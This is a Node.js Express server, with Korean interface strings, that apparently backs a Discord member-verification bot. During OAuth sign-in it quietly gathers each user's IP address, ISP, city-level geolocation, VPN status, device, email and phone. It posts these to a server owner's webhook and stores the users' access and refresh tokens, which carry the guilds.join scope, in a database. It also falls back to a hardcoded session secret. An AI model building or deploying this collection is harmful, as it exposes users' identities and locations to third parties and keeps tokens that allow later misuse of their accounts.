import express from 'express';
import session from 'express-session';
import cookieParser from 'cookie-parser';
import axios from 'axios';
import path from 'path';
import { fileURLToPath } from 'url';
import nacl from 'tweetnacl';
import { query } from '../db/index.js';
import { handleHttpInteraction } from '../bot/http-interactions.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

const PUBLIC_KEY = process.env.PUBLIC_KEY || '';

app.post('/interactions', express.raw({ type: 'application/json' }), async (req, res) => {
  const sig = req.headers['x-signature-ed25519'];
  const ts = req.headers['x-signature-timestamp'];
  const body = req.body;
  try {
    const valid = nacl.sign.detached.verify(
      Buffer.from(ts + body.toString()),
      Buffer.from(sig, 'hex'),
      Buffer.from(PUBLIC_KEY, 'hex')
    );
    if (!valid) return res.status(401).send('Invalid signature');
  } catch (e) {
    return res.status(401).send('Invalid signature');
  }
  const interaction = JSON.parse(body);
  if (interaction.type === 1) return res.json({ type: 1 });
  await handleHttpInteraction(interaction, res);
});

app.set('trust proxy', true);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser(process.env.SESSION_SECRET || 'verify_secret_key'));
app.use(session({
  secret: process.env.SESSION_SECRET || 'verify_secret_key',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 10 * 60 * 1000 }
}));
app.use(express.static(path.join(__dirname, 'public')));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BASE_URL = process.env.BASE_URL;
const BOT_TOKEN = process.env.BOT_TOKEN;
const REDIRECT_URI = `${BASE_URL}/oauth/callback`;

function getRealIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    const ips = xff.split(',').map(s => s.trim());
    for (const ip of ips) {
      if (!isPrivateIp(ip)) return ip;
    }
  }
  return req.headers['x-real-ip'] || req.socket?.remoteAddress || '알 수 없음';
}

function isPrivateIp(ip) {
  if (!ip) return true;
  return ip === '127.0.0.1' || ip === '::1' ||
    ip.startsWith('10.') || ip.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip);
}

function detectDevice(ua) {
  if (!ua) return { type: '알 수 없음', os: '알 수 없음', browser: '알 수 없음' };
  let type = /iphone|android.*mobile|mobile.*android|blackberry|windows phone/i.test(ua) ? '📱 스마트폰'
    : /ipad|android(?!.*mobile)|tablet/i.test(ua) ? '📱 태블릿' : '🖥️ 데스크탑';
  let os = '알 수 없음';
  if (/windows nt 10/i.test(ua)) os = 'Windows 10/11';
  else if (/windows/i.test(ua)) os = 'Windows';
  else if (/iphone os ([\d_]+)/i.test(ua)) os = 'iOS ' + (ua.match(/iphone os ([\d_]+)/i)?.[1]?.replace(/_/g, '.') || '');
  else if (/android ([\d.]+)/i.test(ua)) os = 'Android ' + (ua.match(/android ([\d.]+)/i)?.[1] || '');
  else if (/mac os x/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';
  let browser = '알 수 없음';
  if (/edg\//i.test(ua)) browser = 'Edge';
  else if (/opr\//i.test(ua)) browser = 'Opera';
  else if (/chrome\/([\d.]+)/i.test(ua)) browser = 'Chrome ' + (ua.match(/chrome\/([\d.]+)/i)?.[1]?.split('.')[0] || '');
  else if (/firefox\/([\d.]+)/i.test(ua)) browser = 'Firefox ' + (ua.match(/firefox\/([\d.]+)/i)?.[1]?.split('.')[0] || '');
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  return { type, os, browser };
}

// ─── IP 정보 캐시 (ip-api.com rate limit 방지: 5분 TTL) ─────────────────────
const ipCache = new Map();
const IP_CACHE_TTL = 5 * 60 * 1000;

async function getIpInfo(ip) {
  const def = { isp: '알 수 없음', org: '알 수 없음', country: '알 수 없음', region: '알 수 없음', city: '알 수 없음', mobile: false, proxy: false, hosting: false };
  if (!ip || isPrivateIp(ip)) return def;

  // 캐시 확인 (같은 IP는 5분간 재조회 없음)
  const cached = ipCache.get(ip);
  if (cached && Date.now() < cached.expires) return cached.data;

  try {
    const res = await axios.get(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,mobile,proxy,hosting&lang=ko`,
      { timeout: 4000 }
    );
    if (res.data.status === 'success') {
      const data = {
        isp: res.data.isp || '알 수 없음', org: res.data.org || '알 수 없음',
        country: res.data.country || '알 수 없음', region: res.data.regionName || '알 수 없음',
        city: res.data.city || '알 수 없음', mobile: res.data.mobile || false,
        proxy: res.data.proxy || false, hosting: res.data.hosting || false
      };
      ipCache.set(ip, { data, expires: Date.now() + IP_CACHE_TTL });
      return data;
    }
  } catch(e) {
    // 429(rate limit) 또는 네트워크 오류 시 기본값 반환
    console.warn('[IpInfo] 조회 실패 (기본값 사용):', e.response?.status || e.message);
  }
  return def;
}

// ─── Discord API 429 재시도 래퍼 ────────────────────────────────────────────
async function discordRequest(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (e) {
      const status = e.response?.status;
      if (status === 429 && i < maxRetries - 1) {
        const retryAfter = parseFloat(
          e.response.headers?.['retry-after'] || e.response.data?.retry_after || '2'
        );
        const wait = Math.min(retryAfter * 1000 + 300, 8000);
        console.warn(`[Discord] 429 rate limit, ${wait}ms 후 재시도 (${i + 1}/${maxRetries})`);
        await new Promise(r => setTimeout(r, wait));
      } else {
        throw e;
      }
    }
  }
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.get('/verify', async (req, res) => {
  const { guild_id } = req.query;
  if (!guild_id) return res.status(400).send('Missing guild_id');
  const configRes = await query('SELECT guild_id FROM server_configs WHERE guild_id=$1', [guild_id]);
  if (configRes.rows.length === 0) return res.status(404).sendFile(path.join(__dirname, 'public', 'error.html'));
  req.session.guild_id = guild_id;
  const params = new URLSearchParams({
    client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
    response_type: 'code', scope: 'identify email guilds.join', state: guild_id
  });
  res.redirect(`https://discord.com/oauth2/authorize?${params}`);
});

app.get('/oauth/callback', async (req, res) => {
  const { code, state: guild_id } = req.query;
  if (!code) return res.redirect('/verify/error?msg=' + encodeURIComponent('인증 코드가 없습니다.'));
  try {
    // Discord 토큰 교환 (429 발생 시 재시도)
    const tokenRes = await discordRequest(() => axios.post(
      'https://discord.com/api/oauth2/token',
      new URLSearchParams({ client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    ));
    const { access_token, refresh_token, expires_in } = tokenRes.data;
    const expiresAt = new Date(Date.now() + expires_in * 1000);

    // Discord 유저 정보 조회 (429 발생 시 재시도)
    const userRes = await discordRequest(() => axios.get(
      'https://discord.com/api/users/@me',
      { headers: { Authorization: `Bearer ${access_token}` } }
    ));
    const discordUser = userRes.data;

    const realIp = getRealIp(req);
    const device = detectDevice(req.headers['user-agent'] || '');
    const ipInfo = await getIpInfo(realIp);
    const configRes = await query('SELECT * FROM server_configs WHERE guild_id=$1', [guild_id]);
    const config = configRes.rows[0];
    if (ipInfo.mobile) return res.redirect('/verify/blocked?reason=mobile');
    req.session.pendingVerify = {
      userId: discordUser.id, username: discordUser.username,
      globalName: discordUser.global_name || discordUser.username,
      avatar: discordUser.avatar, email: discordUser.email || '비공개',
      phone: discordUser.phone || '비공개',
      ip: realIp, isp: ipInfo.isp, org: ipInfo.org,
      country: ipInfo.country, region: ipInfo.region, city: ipInfo.city,
      isMobile: ipInfo.mobile, isVpn: ipInfo.proxy, isHosting: ipInfo.hosting,
      deviceType: device.type, os: device.os, browser: device.browser,
      accessToken: access_token, refreshToken: refresh_token,
      tokenExpiresAt: expiresAt.toISOString(), guild_id,
      panelTitle: config?.panel_title || '서버 인증'
    };
    res.redirect('/verify/confirm');
  } catch (err) {
    const status = err.response?.status;
    const oauthErr = err.response?.data ? JSON.stringify(err.response.data) : err.message;
    console.error('[OAuth] Error:', status, oauthErr);

    let userMsg;
    if (status === 429) {
      const retryAfter = err.response?.data?.retry_after || err.response?.headers?.['retry-after'] || 30;
      userMsg = `요청이 너무 많습니다. ${Math.ceil(retryAfter)}초 후 다시 시도해 주세요.`;
    } else {
      userMsg = '인증 처리 중 오류가 발생했습니다. (' + (err.response?.data?.error_description || err.response?.data?.error || err.message) + ')';
    }
    res.redirect('/verify/error?msg=' + encodeURIComponent(userMsg));
  }
});

app.get('/verify/confirm', (req, res) => {
  if (!req.session.pendingVerify) return res.redirect('/verify/error?msg=' + encodeURIComponent('세션이 만료되었습니다.'));
  res.sendFile(path.join(__dirname, 'public', 'confirm.html'));
});

app.get('/verify/blocked', (req, res) => res.sendFile(path.join(__dirname, 'public', 'blocked.html')));

app.get('/api/verify-data', (req, res) => {
  if (!req.session.pendingVerify) return res.status(401).json({ error: 'No session' });
  const d = req.session.pendingVerify;
  res.json({ userId: d.userId, username: d.username, globalName: d.globalName, avatar: d.avatar, panelTitle: d.panelTitle });
});

app.post('/api/verify-complete', async (req, res) => {
  if (!req.session.pendingVerify) return res.status(401).json({ success: false, error: '세션이 만료되었습니다.' });
  const d = req.session.pendingVerify;
  try {
    const configRes = await query('SELECT * FROM server_configs WHERE guild_id=$1', [d.guild_id]);
    if (configRes.rows.length === 0) return res.json({ success: false, error: '서버 설정을 찾을 수 없습니다.' });
    const config = configRes.rows[0];

    try {
      await axios.put(
        `https://discord.com/api/v10/guilds/${d.guild_id}/members/${d.userId}`,
        { access_token: d.accessToken, roles: config.role_id ? [config.role_id] : [] },
        { headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' } }
      );
    } catch(e) {
      if (e.response?.status === 204 || e.response?.status === 200) {
        // Already in guild — do nothing
      } else {
        try {
          await axios.put(
            `https://discord.com/api/v10/guilds/${d.guild_id}/members/${d.userId}/roles/${config.role_id}`,
            {},
            { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
          );
        } catch(e2) { console.error('[Verify] Role error:', e2.message); }
      }
    }

    await query(
      `INSERT INTO verified_users (user_id, guild_id, username, email, ip, isp, carrier, country, region, city, access_token, refresh_token, token_expires_at)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)
       ON CONFLICT (user_id, guild_id) DO UPDATE SET
         username=$3, email=$4, ip=$5, isp=$6, carrier=$7, country=$8, region=$9, city=$10,
         access_token=$11, refresh_token=$12, token_expires_at=$13`,
      [d.userId, d.guild_id, d.username, d.email, d.ip, d.isp, d.org,
       d.country, d.region, d.city, d.accessToken, d.refreshToken, d.tokenExpiresAt]
    );

    if (config.webhook_url) {
      const avatarUrl = d.avatar
        ? `https://cdn.discordapp.com/avatars/${d.userId}/${d.avatar}.png`
        : `https://cdn.discordapp.com/embed/avatars/0.png`;
      let networkStatus = '🏠 일반 (와이파이/유선)';
      if (d.isVpn) networkStatus = '🚨 VPN / 프록시 감지';
      else if (d.isHosting) networkStatus = '⚠️ 서버/데이터센터 IP';
      else if (d.isMobile) networkStatus = '📱 모바일 데이터';

      try {
        await axios.post(config.webhook_url, {
          embeds: [{
            title: '🛡️ 인증 로그', color: d.isVpn ? 0xED4245 : d.isHosting ? 0xFEE75C : 0x57F287,
            thumbnail: { url: avatarUrl },
            fields: [
              { name: '👤 유저', value: `<@${d.userId}> (${d.globalName})`, inline: true },
              { name: '🆔 유저 ID', value: `\`${d.userId}\``, inline: true },
              { name: '📧 이메일', value: d.email, inline: true },
              { name: '📱 전화번호', value: d.phone || '비공개', inline: true },
              { name: '🌐 접속 IP', value: `\`${d.ip}\``, inline: true },
              { name: '🏢 ISP', value: d.isp, inline: true },
              { name: '🔒 네트워크', value: networkStatus, inline: false },
              { name: '📍 예상 지역', value: `${d.country} / ${d.region} / ${d.city}`, inline: false },
              { name: '💻 기기', value: d.deviceType, inline: true },
              { name: '🖥️ OS', value: d.os, inline: true },
              { name: '🌏 브라우저', value: d.browser, inline: true }
            ],
            footer: { text: `인증 시각: ${new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' })}` }
          }]
        });
      } catch(e) { console.error('[Verify] Webhook error:', e.message); }
    }

    req.session.pendingVerify = null;
    res.json({ success: true });
  } catch(err) {
    console.error('[Verify] Error:', err);
    res.status(500).json({ success: false, error: '서버 오류가 발생했습니다.' });
  }
});

app.get('/verify/done', (req, res) => res.sendFile(path.join(__dirname, 'public', 'done.html')));
app.get('/verify/error', (req, res) => res.sendFile(path.join(__dirname, 'public', 'error.html')));
app.get('/health', (req, res) => res.json({ status: 'ok', mode: 'http-interactions' }));

export default app;
